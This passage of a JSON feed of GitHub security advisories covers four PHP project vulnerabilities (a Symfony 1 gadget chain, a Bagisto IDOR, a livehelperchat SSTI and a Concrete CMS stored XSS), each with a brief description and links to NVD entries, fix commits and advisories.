href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28859\">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166\">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r",
            "title": "[friendsofsymfony1/symfony1] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency",
            "date_modified": "2024-03-18T20:36:06.000Z",
            "date_published": "2024-03-18T20:36:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Insecure Direct Object Reference (IDOR) in Bagisto v.1.5.0 allows an attacker to obtain sensitive information via the invoice ID parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36238\">https://nvd.nist.gov/vuln/detail/CVE-2023-36238</a></li>\n<li><a href=\"https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto\">https://github.com/Ek-Saini/security/blob/main/IDOR-Bagisto</a></li>\n<li><a href=\"https://github.com/bagisto/bagisto/pull/4697\">https://github.com/bagisto/bagisto/pull/4697</a></li>\n<li><a href=\"https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17\">https://github.com/bagisto/bagisto/commit/2a24098cb582e072c87177e0ad17be45f240ad17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmc7-hmmw-g96q\">https://github.com/advisories/GHSA-pmc7-hmmw-g96q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmc7-hmmw-g96q",
            "title": "[bagisto/bagisto] Bagisto vulnerable to Insecure Direct Object Reference (IDOR)",
            "date_modified": "2024-03-15T21:03:01.000Z",
            "date_published": "2024-03-13T21:31:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmc7-hmmw-g96q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Server-Side Template Injection (SSTI) vulnerability in livehelperchat before 4.34, allows remote attackers to execute arbitrary code and obtain sensitive information via the search parameter in lhc_web/modules/lhfaq/faqweight.php.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27516\">https://nvd.nist.gov/vuln/detail/CVE-2024-27516</a></li>\n<li><a href=\"https://github.com/LiveHelperChat/livehelperchat/issues/2054\">https://github.com/LiveHelperChat/livehelperchat/issues/2054</a></li>\n<li><a href=\"https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab\">https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4cp-2q7v-hg9q\">https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4cp-2q7v-hg9q",
            "title": "[remdex/livehelperchat] livehelperchat Server-Side Template Injection",
            "date_modified": "2024-03-22T15:46:22.000Z",
            "date_published": "2024-02-29T03:33:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4cp-2q7v-hg9q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48650\">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>\n<li><a href=\"https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes\">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>\n<li><a href=\"https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates\">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0\">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b\">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x577-gcc9-9xjj\">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj",
            "title": "[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name",
            "date_modified": "2024-03-10T05:00:59.000Z",
            "date_published": "2024-02-29T03:33:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x577-gcc9-9xjj"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}